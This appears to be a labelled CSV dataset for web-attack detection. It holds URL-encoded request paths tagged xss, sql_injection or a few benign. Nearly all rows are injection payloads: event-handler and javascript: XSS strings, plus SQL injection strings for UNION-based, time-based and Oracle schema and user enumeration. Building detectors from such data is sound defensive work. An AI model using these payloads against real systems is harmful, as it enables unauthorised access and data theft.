text,label
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Ccolgroup+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fcolgroup%3E,xss
/api/v2/comments/%3Cabbr+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fabbr%3E,xss
/api/v1/comments?text=%3Ctbody+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Ftbody%3E,xss
/api/v2/profile?id=%3Csource+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fsource%3E,xss
/api/v1/comments?text=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cdetails+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fdetails%3E,xss
/v1/products/%22or+1%3D1+or+%22%22%3D%22,sql_injection
/api/v2/profile?id=%3Ccenter+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fcenter%3E,xss
/v1/search?q=%3Chr+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fhr%3E,xss
/api/v1/reviews?body=%3Ca+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fa%3E,xss
/api/v1/feedback?message=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Csvg+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fsvg%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Ccaption+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fcaption%3E,xss
/api/v1/reviews?body=%3Chtml+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fhtml%3E,xss
/api/v2/comments/%3Cdetails+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fdetails%3E,xss
/api/v1/feedback?message=%3Cplaintext+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fplaintext%3E,xss
/api/v2/items/%27+AND+1%3Dutl_inaddr.get_host_address%28%28SELECT+DISTINCT%28column_name%29+FROM+%28SELECT+DISTINCT%28column_name%29%2C+ROWNUM+AS+LIMIT+FROM+all_tab_columns%29+WHERE+LIMIT%3D6%29%29+AND+%27i%27%3D%27i?key=API_KEY,sql_injection
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Ccode+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fcode%3E,xss
/v1/search?q=%3Cframe+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fframe%3E,xss
/v1/search?q=%3Cem+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fem%3E,xss
/api/v1/feedback?message=%3Csvg+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fsvg%3E,xss
/api/v1/reviews?body=%3Cs+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fs%3E,xss
/api/v1/comments?text=%3Cul+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Ful%3E%3Cinput+autofocus%3E,xss
/v1/search?q=%3Cdetails+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fdetails%3E,xss
/api/v2/profile?id=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Csource+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fsource%3E,xss
/api/v1/feedback?message=%3Coptgroup+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Foptgroup%3E,xss
/v1/profile?bio=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cplaintext+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fplaintext%3E,xss
/api/v1/reviews?body=%3Ctemplate+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Ftemplate%3E%3Cinput+id%3Dy+autofocus%3E,xss
/v1/profile?bio=%3Cins+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fins%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Csvg+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fsvg%3E,xss
/api/v2/profile?id=%3Csvg%3E%3Cdd+onload%3Dalert%281%29%3E%3C%2Fdd%3E,xss
/api/v1/comments?text=%3Ctable+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftable%3E,xss
/api/v1/feedback?message=%3Cu+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fu%3E,xss
/api/v2/items/%27%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520%2F%2A?key=API_KEY,sql_injection
/api/v2/items/%22%29%3Bwaitfor+delay+%270%3A0%3A__TIME__%27--?key=API_KEY,sql_injection
/api/v1/comments?text=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Crt+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Frt%3E,xss
/api/v2/comments/%3Col+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fol%3E,xss
/api/v1/feedback?message=%3Cabbr+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fabbr%3E,xss
/api/v1/comments?text=%3Cfont+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Ffont%3E,xss
/api/v1/comments?text=%3Cfieldset+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ffieldset%3E,xss
/api/v2/profile?id=%3Cacronym+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Facronym%3E,xss
/api/v2/profile?id=%3Cins+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fins%3E,xss
/v1/profile?bio=%3Cpre+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fpre%3E,xss
/api/v1/comments?text=%3Cdt+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fdt%3E,xss
/v1/search?q=%3Celement+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Felement%3E%3Cinput+autofocus%3E,xss
/v1/products/%C3%83%C2%BD+or+1%3D1+--,sql_injection
/v1/search?q=%3Cmark+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fmark%3E,xss
/v1/profile?bio=%3Ci+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fi%3E,xss
/v1/profile?bio=%3Ccol+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcol%3E,xss
/api/v2/search?q=1+or+pg_sleep%28__TIME__%29--&key=API_KEY,sql_injection
/api/v1/comments?text=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Carea+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Farea%3E,xss
/api/v1/feedback?message=%3Ctfoot+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftfoot%3E,xss
/api/v2/profile?id=%3Cscript+itworksinallbrowsers%3E%2F%2A%3Cscript%2A+%2A%2Falert%281%29%3C%2Fscript+%3F,xss
/api/v2/comments/%3Ccontent+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fcontent%3E%3Cinput+autofocus%3E,xss
/api/v2/comments/%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cspacer+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fspacer%3E,xss
/api/v2/comments/%3Cblockquote+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fblockquote%3E,xss
/v1/search?q=%3Cdatalist+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fdatalist%3E,xss
/api/v1/login?username=%27%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--&password=pass,sql_injection
/api/v1/reviews?body=%3Ctbody+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftbody%3E,xss
/v1/search?q=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E,xss
/api/v2/items/insert?key=API_KEY,sql_injection
/api/v1/reviews?body=%3Csummary+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fsummary%3E%3Cinput+autofocus%3E,xss
/api/v1/reviews?body=%3Cnobr+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fnobr%3E,xss
/api/v1/users?id=%2528,sql_injection
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Csummary+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fsummary%3E,xss
/api/v1/comments?text=%3Ccolgroup+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fcolgroup%3E,xss
/api/v1/feedback?message=%3Cspan+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fspan%3E,xss
/api/v2/comments/%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cbutton+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fbutton%3E,xss
/api/v1/comments?text=%3Csvg%3E%3Ckbd+onload%3Dalert%281%29%3E%3C%2Fkbd%3E,xss
/v1/profile?bio=%3Caudio+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Faudio%3E,xss
/api/v1/login?username=or+true--&password=pass,sql_injection
/api/v2/search?q=%27+or+userid+like+%27%25&key=API_KEY,sql_injection
/v1/orders?customer_id=%22%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520--&status=active,sql_injection
/api/v1/comments?text=%3Caddress+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Faddress%3E,xss
/v1/search?q=%3Cscript+src%3D%22data%3Atext%2Fjavascript%2Calert%281%29%22%3E%3C%2Fscript%3E,xss
/api/v2/profile?id=%3Cxss+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fxss%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cstyle+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fstyle%3E,xss
/api/v2/profile?id=%3Cisindex+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fisindex%3E,xss
/api/v1/reviews?body=%3Cx%250Aonxxx%3D1,xss
/api/v1/reviews?body=%3Cthead+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fthead%3E,xss
/api/v1/users?id=HAVING+1%3D1%23,sql_injection
/api/v1/feedback?message=%3Cimg+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fimg%3E,xss
/v1/search?q=%3Ch1+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fh1%3E%3Cinput+autofocus%3E,xss
/api/v1/comments?text=%3Ch1+onclick%3D%22alert%281%29%22%3Etest%3C%2Fh1%3E,xss
/api/v1/reviews?body=%3Cimg+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fimg%3E,xss
/v1/profile?bio=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22,xss
/api/v1/reviews?body=%3Ctextarea+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Ftextarea%3E,xss
/api/v2/profile?id=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Ctextarea+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Ftextarea%3E,xss
/api/v1/reviews?body=%3Cimg+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fimg%3E,xss
/api/v2/comments/%3Cxmp+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fxmp%3E,xss
/api/v1/feedback?message=%3Cdl+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdl%3E,xss
/v1/profile?bio=%3Ciframe+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fiframe%3E,xss
/v1/search?q=%3Ctbody+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Ftbody%3E,xss
/v1/products/%27%29+or+%271%27%3D%271%27%2F%2A,sql_injection
/api/v1/feedback?message=%3Clisting+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Flisting%3E,xss
/v1/search?q=%3Cul+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ful%3E,xss
/api/v2/search?q=%27+UNION+select+table_schema%2Ctable_name+FROM+information_Schema.tables%3B%23&key=API_KEY,sql_injection
/api/v2/profile?id=%3Cplaintext+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fplaintext%3E,xss
/v1/profile?bio=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cmap+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fmap%3E,xss
/api/v2/comments/%3Cnav+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fnav%3E,xss
/api/v1/feedback?message=%3Cmenu+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmenu%3E,xss
/api/v2/profile?id=%3Cem+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fem%3E,xss
/api/v2/profile?id=%3Cslot+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fslot%3E,xss
/v1/profile?bio=%3Csup+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fsup%3E,xss
/v1/profile?bio=%3CiFrAMe%2Fsrc+%5C%2F%5C%2Fonload+%3D+prompt%281%29,xss
/api/v1/comments?text=%3Csamp+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fsamp%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cbutton+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fbutton%3E,xss
/api/v1/login?username=%22%2F%2A&password=pass,sql_injection
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cdatalist+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fdatalist%3E,xss
/api/v1/reviews?body=%3Ctime+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftime%3E,xss
/api/v2/comments/%3Cwbr+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fwbr%3E%3Cinput+autofocus%3E,xss
/api/v2/search?q=SLEEP%281%29%2F%2A%27+or+SLEEP%281%29+or+%27%22+or+SLEEP%281%29+or+%22%2A%2F&key=API_KEY,sql_injection
/api/v2/items/a%27?key=API_KEY,sql_injection
/api/v1/comments?text=alert,xss
/api/v1/reviews?body=%3Ca+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fa%3E,xss
/api/v1/comments?text=%3Cfont+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Ffont%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v2/profile?id=%3Csvg%3E%3Cmenuitem+onload%3Dalert%281%29%3E%3C%2Fmenuitem%3E,xss
/api/v2/comments/%3Cisindex+action%3Djavascript%3Aalert%281%29+type%3Dsubmit+value%3Dclick%3E,xss
/v1/search?q=%3Carticle+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Farticle%3E,xss
/api/v2/profile?id=%3Cplaintext+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fplaintext%3E,xss
/api/v2/items/AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%29%29%23?key=API_KEY,sql_injection
/api/v2/comments/%3Ckeygen+id%3Dx+onfocus%3Dalert%281%29%3E,xss
/api/v1/reviews?body=%3Ccolgroup+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fcolgroup%3E,xss
/api/v1/users?id=UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%23,sql_injection
/v1/profile?bio=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cdd+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fdd%3E,xss
/api/v1/feedback?message=%3Cfooter+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Ffooter%3E,xss
/api/v1/orders/153717,benign
/v1/search?q=%3Ctextarea+oncut%3Dalert%281%29+autofocus%3EXSS%3C%2Ftextarea%3E,xss
/v1/search?q=%3Cprogress+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fprogress%3E,xss
/api/v1/comments?text=%22%3E%3Clink+rel%3Dimport+href%3Ddata%3Atext%2Fhtml,xss
/v1/profile?bio=%3Caside+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Faside%3E,xss
/api/v2/items/%27hi%27+or+%27x%27%3D%27x%27%3B?key=API_KEY,sql_injection
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cstrong+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fstrong%3E,xss
/api/v1/users?id=tz_offset,sql_injection
/v1/profile?bio=%3Cmenuitem+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fmenuitem%3E,xss
/api/v2/profile?id=%3Cbig+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fbig%3E,xss
/v1/orders?customer_id=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29%23&status=active,sql_injection
/v1/search?q=%3Cstyle+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fstyle%3E,xss
/api/v2/items/%22+and+0%3Dbenchmark%283000000%2CMD5%281%29%29%2520%2523?key=API_KEY,sql_injection
/api/v1/search?q=%29+and+0%3Dbenchmark%283000000%2CMD5%281%29%29%2520%2F%2A,sql_injection
/api/v1/comments?text=%3Cbase+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbase%3E,xss
/api/v1/comments?text=%3Cinput+type%3Dradio+id%3Dx+onfocus%3Dalert%281%29%3E,xss
/api/v1/feedback?message=%3Cem+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fem%3E,xss
/v1/profile?bio=%3Ctbody+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Ftbody%3E%3Cinput+autofocus%3E,xss
/api/v2/comments/%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Crtc+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Frtc%3E,xss
/api/v2/profile?id=%3Cs+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fs%3E,xss
/v1/search?q=%3Ccommand+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fcommand%3E%3Cinput+autofocus%3E,xss
/api/v1/comments?text=%3Cthead+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fthead%3E,xss
/v1/orders?customer_id=%27%2C%28select%2520if%28count%28%2A%29%21%3D-1%2Cbenchmark%283000000%2CMD5%281%29%29%2Cbenchmark%283000000%2CMD5%281%29%29%29%29--&status=active,sql_injection
/api/v1/comments?text=%3Cdata+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fdata%3E,xss
/api/v1/search?q=%27%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520%2F%2A,sql_injection
/api/v2/items/ORDER+BY+20%23?key=API_KEY,sql_injection
/v1/profile?bio=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cabbr+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fabbr%3E,xss
/v1/profile?bio=%3Cmeter+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fmeter%3E,xss
/v1/products/%27+AND+1%3Dutl_inaddr.get_host_address%28%28SELECT+DISTINCT%28USERNAME%29+FROM+%28SELECT+DISTINCT%28USERNAME%29%2C+ROWNUM+AS+LIMIT+FROM+SYS.ALL_USERS%29+WHERE+LIMIT%3D4%29%29+AND+%27i%27%3D%27i,sql_injection
/v1/products/exec%28%40s%29,sql_injection
/api/v2/profile?id=%3Csvg%3E%3Csub+onload%3Dalert%281%29%3E%3C%2Fsub%3E,xss
/api/v1/reviews?body=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Ccanvas+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fcanvas%3E,xss
/api/v2/profile?id=%3Ch1+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fh1%3E,xss
/api/v1/search?q=UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%23,sql_injection
/api/v2/comments/%3Clink+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Flink%3E,xss
/api/v2/profile?id=%3Cins+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fins%3E,xss
/api/v2/items/%22%29+or+true--?key=API_KEY,sql_injection
/v1/products/%29%29+or+pg_sleep%28__TIME__%29--%22,sql_injection
/api/v1/reviews?body=%3Csvg%3E%3Cs+onload%3Dalert%281%29%3E%3C%2Fs%3E,xss
/api/v1/reviews?body=%3Caudio+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Faudio%3E,xss
/api/v1/login?username=UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%23&password=pass,sql_injection
/api/v1/comments?text=%3Crt+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Frt%3E,xss
/api/v1/orders/98618,benign
/v1/profile?bio=%3Cth+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fth%3E,xss
/v1/profile?bio=%3Ckbd+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Fkbd%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v1/comments?text=%3Chtml+ontouchmove%3Dalert%281%29%3E,xss
/v1/profile?bio=%3Cfieldset+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Ffieldset%3E,xss
/v1/search?q=%3Cmark+onclick%3D%22alert%281%29%22%3Etest%3C%2Fmark%3E,xss
/v1/search?q=%3Cbody%2Fonload%3D,xss
/api/v1/reviews?body=%3Csummary+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fsummary%3E,xss
/api/v1/comments?text=%3Cbr+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fbr%3E,xss
/api/v1/reviews?body=%3Cx+%256Fnxxx%3D1,xss
/api/v1/orders/28403,benign
/v1/search?q=%3Cpicture+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fpicture%3E,xss
/api/v1/reviews?body=%3Ch1+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fh1%3E,xss
/v1/search?q=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cdl+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fdl%3E,xss
/api/v1/reviews?body=%3Coutput+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Foutput%3E,xss
/api/v2/profile?id=%3Cul+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Ful%3E,xss
/api/v1/comments?text=%3Cdiv+id%3D%2292%22%3E%3Cdiv+style%3D%22background%3Aurl%28http%3A%2F%2Ffoo.f%2Ff+oo%2F%3Bcolor%3Ared%2F%2A%2Ffoo.jpg%29%3B%22%3EX%3C%2Fdiv%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E%3Cdiv+id%3D%2293%22%3E%3Cdiv+style%3D%22list-style%3Aurl%28http%3A%2F%2Ffoo.f%29%5C20url%28javascript%3Aalert%2893%29%29%3B%22%3EX%3C%2Fdiv%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E,xss
/api/v1/users?id=%22+and+0%3Dbenchmark%283000000%2CMD5%281%29%29%2520--,sql_injection
/v1/profile?bio=%3Cs+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fs%3E%3Cinput+autofocus%3E,xss
/api/v2/profile?id=%3Cpicture+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fpicture%3E,xss
/api/v2/comments/%3Capplet+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fapplet%3E,xss
/api/v1/reviews?body=%3Ccite+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcite%3E,xss
/api/v2/profile?id=%3Capplet+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fapplet%3E,xss
/api/v2/comments/%3Cfooter+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Ffooter%3E,xss
